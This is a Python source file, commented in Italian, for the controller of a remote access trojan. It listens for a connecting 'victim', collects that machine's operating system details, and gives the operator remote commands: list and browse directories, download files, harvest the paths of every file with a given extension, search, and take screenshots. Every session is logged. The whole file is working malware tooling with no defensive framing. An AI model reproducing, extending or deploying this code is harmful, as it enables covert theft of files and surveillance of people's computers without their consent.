import os
import pickle
from socket import *
import platform
import time
from time import sleep
import signal
from os import system
import traceback
import sys
from traceback import print_exc
from tqdm import tqdm
from colorama import Fore

IP = "localhost"
PORT = 8082  # Porta di 2Ascolto del TCP
ADDR = (IP, PORT)
SIZE = 4096
FORMAT = "utf-8"
fileLog = "###FILELOG RESULT###\n"

# OK funzione di pulizia schermo per unix e windows
def clearScreen():
    if platform.system() == "Windows":
        system("cls")
    else:
        system("clear")


# OK gestisce il ctrl-C per l'uscita
def signalHandler(signum, frame):
    msg = "Uscita effettuata con successo"
    print(":", msg, end="", flush=True)
    exit(1)


# OK crea connessione
def serverConnection():
    try:
        server = socket(AF_INET, SOCK_STREAM)
        server.bind(ADDR)
        server.listen(5)
        print()
        for i in tqdm(range(20), desc=Fore.LIGHTWHITE_EX + "[STARTING] Server starting...", colour="green", ncols=50,
                      bar_format="{desc}: {percentage:3.0f}% {bar}"):
            sleep(0.2)
        print(f"[LISTENING] The Sever is waiting for a victim...\n")
        return server
    except:
        traceback.print_exc()
        print(f"[ERROR] Accensione server non riuscita...\n")
        return "errore"


# OK lista dei comandi disponibili per il controllo remoto
def commandsHelp():
    print(f"\n#####                                       Comandi disponibili                                                     ####")
    print()
    print(f"Download di file:                           download <nomeFile.estensione> (txt docx pdf video foto excel cartelle zip ")
    print(f"Crea un file .txt con i percorsi di tutti i file con una certa estensione:   filespath <estensione>")
    print(f"Mostra Working Directory:                   pwd")
    print(f"Lista dei file in un percorso:              ls")
    print(f"Cambia la Working Directory:                cd <path>")
    print(f"Torna alla cartella precedente:             cd ..")
    print(f"Cerca un tipo di estensione in un path:     find <.estensione> <Path>")
    print(f"Effettua screenshot:                        screenshot")
    print(f"Esci dal controllo remoto:                  exit")
    print(f"Ripulisci terminale:                        clear")
    print(f"Informazioni so client:                     info")
    print()
    print("####################################\n")


# OK STAMPA INFO CLIENT
def printInformazioni(clientConnection, addr):
    buff = 1
    risposta = "1"
    nbytes = 1
    newNBytes=""

    global fileLog
    print(f"\nInformation on the victim's Operating System:")
    fileLog = fileLog + "\n" + f"\nInformation on the victim's Operating System:" + "\n"
    try:
        while buff and nbytes != '':
            nbytes = clientConnection.recv(256).decode(FORMAT)
            if nbytes[0:1].isdigit():
                while nbytes[0:1].isdigit():
                    newNBytes = newNBytes + nbytes[0:1]
                    nbytes = nbytes[1:]

            buff = clientConnection.recv((int(newNBytes))).decode(FORMAT)
            print("\n"+ buff)
            fileLog=fileLog+"\n"+buff+"\n"

    except:
        traceback.print_exc()
        print(f"[NOT RECEIVING] Informazioni non ricevute\n")
        fileLog = fileLog + "\n" + f"[NOT RECEIVING] Informazioni non ricevute\n" + "\n"
        raise Exception


# FILESPATH
def filespath(clientConnection):
    for i in tqdm(range(20), desc=Fore.LIGHTWHITE_EX + "Ricezione informazioni", colour="green", ncols=50, bar_format="{desc}: {percentage:3.0f}% {bar}"):
        sleep(0.2)
    print("Attendi...")
    try:
        nomeFile = "FilesPath.txt"
        file = open(nomeFile, 'ab')
        newNBytes = ""
        filesize = clientConnection.recv(256).decode(FORMAT)

        for i in tqdm(range(20), desc=Fore.LIGHTWHITE_EX + "Completamento Operazione", colour="green", ncols=50, bar_format="{desc}: {percentage:3.0f}% {bar}"):
            sleep(0.2)

        file.write(clientConnection.recv(int(filesize)+800000))
        file.close()

        if os.path.getsize(nomeFile) <= 0:
            print(f"File con percorsi dei file creato ma non scritto correttamente!\n")
        else:
            print(f"File con percorsi dei file creato e scritto correttamente!\n")

    except:
        traceback.print_exc()
        print("Filespath non riuscito\n")


# CONTROLLO REMOTO
def remoteControl(clientConnection):
    while True:
        try:
            pathError = clientConnection.recv(1024).decode(FORMAT)

            if pathError[0:7]=="[ERROR]":
                path=clientConnection.recv(1024).decode(FORMAT)
                print(path+"$ "+pathError)
            else:
                path=pathError

            comando = input(path + "$ ")
            while comando == "":
                comando = input(path + "$ ")

            global fileLog
            fileLog=fileLog+"\n"+path + "$ "+comando+"\n"

            clientConnection.send((comando).encode(FORMAT))

            if comando == "exit":
                print(f"[REMOTE CONTROL CLOSED] Procedura di controllo remoto conclusa con successo!\n")
                fileLog = fileLog + "\n" + f"[REMOTE CONTROL CLOSED] Procedura di controllo remoto conclusa con successo!\n" + "\n"
                break

            elif comando[0:2] == "ls":
                listdir = pickle.loads(clientConnection.recv(1024))
                for item in listdir:
                    print("-: " + item)
                    fileLog = fileLog + "\n" + "-: " + item + "\n"

            elif comando[0:8] == "download":
                try:
                    file = open(comando[10:len(comando) - 1], 'wb')
                    filesize = clientConnection.recv(1024).decode(FORMAT)

                    for i in tqdm(range(20), desc=Fore.LIGHTWHITE_EX + "Completamento Operazione", colour="green", ncols=50, bar_format="{desc}: {percentage:3.0f}% {bar}"):
                        sleep(0.2)

                    file.write(clientConnection.recv(int(filesize)))
                    file.close()
                    if os.path.getsize(comando[10:len(comando) - 1]) <= 0:
                        print("Download fallito\n")
                    else:
                        print(f"File scaricato correttamente\n")

                    time.sleep(2)
                except:
                    traceback.print_exc()
                    print("Download fallito\n")

            elif comando == "pwd":
                pwdresult = clientConnection.recv(1024).decode(FORMAT)
                print("\"" + pwdresult + "\"")
                fileLog = fileLog + "\n" + pwdresult + "\n"

            # "Crea un file .txt con i percorsi di tutti i file con una certa estensione:   filespath <estensione>"
            elif comando[0:9] == "filespath":
                filespath(clientConnection)

            elif comando[0:4] == "find":
                for i in tqdm(range(20), desc=Fore.LIGHTWHITE_EX + "Ricezione informazioni", colour="green", ncols=50,bar_format="{desc}: {percentage:3.0f}% {bar}"):
                    sleep(0.2)
                print("Attendi")
                try:
                    dato=clientConnection.recv(80000000).decode(FORMAT)
                    print(dato)
                    fileLog = fileLog + "\n" + dato + "\n"
                except:
                    traceback.print_exc()
                    print("Find non eseguito correttamente\n")

            elif comando == "clear":
                clearScreen()

            elif comando == "help":
                commandsHelp()

            elif comando[0:5] == "cd .." or comando[0:2] == "cd":
                pass

            elif comando[0:4] == "info":
                output = clientConnection.recv(1024).decode(FORMAT)
                print(output)
                fileLog = fileLog + "\n" + output + "\n"

            elif comando[0:10] == "screenshot":
                nomeFoto = input("Inserire nome foto: ")
                try:
                    file = open(nomeFoto, 'wb')
                    filesize=clientConnection.recv(1024).decode(FORMAT)

                    for i in tqdm(range(20), desc=Fore.LIGHTWHITE_EX + "Completamento Operazione", colour="green", ncols=50, bar_format="{desc}: {percentage:3.0f}% {bar}"):
                        sleep(0.2)

                    file.write(clientConnection.recv(int(filesize)))
                    file.close()

                except:
                    traceback.print_exc()
                    print("Screenshot fallito\n")
                    os.remove(nomeFoto)
            else:
               print("[COMANDO ERRATO/NON DISPONIBILE] Command not found... \n")

        except Exception as e:
            traceback.print_exc()
            if e.__class__.__name__ == "ConnectionResetError":
                print(f"[CONNECTION INTERRUPTED] Connessione interrotta\n")
                fileLog = fileLog + "\n" + "[CONNECTION INTERRUPTED] Connessione interrotta\n" + "\n"
                raise e
            else:
                raise e


def main():
    try:
        signal.signal(signal.SIGINT, signalHandler)
        server = serverConnection()
        if server == "errore":
            traceback.print_exc()
            raise Exception
        else:
            exit = False
            while exit == False:
                clientConnection, addr = server.accept()
                print(f"[CONNECTED] Established a connection with the Victim using socket: {addr}")
                os.mkdir(f"cartellaClient {addr}")
                os.chdir(os.getcwd() + "/" + f"cartellaClient {addr}")

                global fileLog
                fileLog = fileLog + "\n" + "[CONNECTED] Established a connection with the Victim; Socket: {addr} is connected to the server" + "\n"

                for i in tqdm(range(25), desc=Fore.LIGHTWHITE_EX + f"[RECEIVING] Loading information on the victim's operating system...", colour="green", ncols=65, bar_format="{desc}: {percentage:3.0f}% {bar}"):
                    sleep(0.2)

                # RICEVO INFORMAZIONI SISTEMA OPERATIVO
                try:
                    printInformazioni(clientConnection,addr)
                except Exception as e:
                    traceback.print_exc()
                    if e.__class__.__name__ == "ConnectionResetError":
                        print(f"[ERROR] Connessione con client {addr} interrotta!!!\n")
                        exit = True
                    else:
                        print(f"[ERROR] Qualcosa nella print informazioni non ha funzionato\n")


                #ATTIVO LA REMOTE CONTROL
                attivo = 1
                print()
                while attivo == 1:
                    try:
                        for i in tqdm(range(25), desc=Fore.LIGHTWHITE_EX + f"[REMOTE CONTROL] Starting procedure...", colour="green", ncols=65, bar_format="{desc}: {percentage:3.0f}% {bar}"):
                            sleep(0.2)
                        print(f"[REMOTE CONTROL] Procedure activated; you are now on the victim's pc in the path below...\n")
                        remoteControl(clientConnection)
                        attivo = 0

                    except Exception as e:
                        traceback.print_exc()
                        if e.__class__.__name__ == "ConnectionResetError":
                            print(f"La connessione con il client {addr} si è interrotta\n")
                            fileLog = fileLog + "\n" + f"La connessione con il client {addr} si è interrotta\n" + "\n"
                            attivo = 0
                        else:
                            risposta="null"
                            clientConnection.recv(300000)
                            while risposta !='0' and risposta !='1':
                                risposta = input(f"Remote control non disponibile, riprovare? Y-1/N-0 ")
                                if risposta == '1':
                                    attivo = 1
                                elif risposta == '0':
                                    attivo = 0

                clientConnection.close()
                for i in tqdm(range(10), desc=Fore.LIGHTWHITE_EX + "Chiusura connessione client", colour="green", ncols=50,
                              bar_format="{desc}: {percentage:3.0f}% {bar}"):
                    sleep(0.2)
                print(f"[CLOSED] Client Connection closed succesfully!")
                print()

                # Le operazioni sono concluse e decido come procedere
                print(f"[DECISION] Do you want to close the Sever or keep listening for new Clients?")
                print(f"[DECISION] 1 - Keep Listening")
                print(f"[DECISION] 2 - Close Server")
                restartDecision = input("> ")

                if restartDecision == '2':
                    exit = True
                    print(f"[INFO] The Server was shut down successfully")
                    file = open("fileLog.txt", "w")
                    file.write(fileLog)
                    file.close()
                    fileLog = ""
                    os.chdir("..")
                    server.close()
                    sys.exit(0)
                elif restartDecision == '1':
                    file = open("fileLog.txt", "w")
                    file.write(fileLog)
                    file.close()
                    fileLog=""
                    os.chdir("..")
                    print(f"[INFO] The server keeps listening...")
                    t_end = time.time() + 3
                    while time.time() < t_end:
                        print(".", end="")
                        time.sleep(1)
                        print(".", end="")
                        time.sleep(1)
                        print(".")
                        time.sleep(1)
                else:
                    file = open("fileLog.txt", "w")
                    file.write(fileLog)
                    file.close()
                    fileLog = ""
                    os.chdir("..")
                    clientConnection.close()
                    server.close()

    except Exception as e:
        traceback.print_exc()
        if e.__class__.__name__ == "ConnectionResetError":
            print(f"[CONNECTION INTERRUPTED] Connessione interrotta\n")
            raise e
        else:
            raise e
if __name__ == "__main__":
    try:
        main()
    except:
        traceback.print_exc()
        file = open("fileLog.txt", "w")
        file.write(fileLog)
        file.close()
        fileLog = ""
        for i in tqdm(range(15), desc=Fore.LIGHTWHITE_EX + "Chiusura Server...", colour="green", ncols=50,
                      bar_format="{desc}: {percentage:3.0f}% {bar}"):
            sleep(0.2)
        print(f"[CLOSE] Server chiuso.")


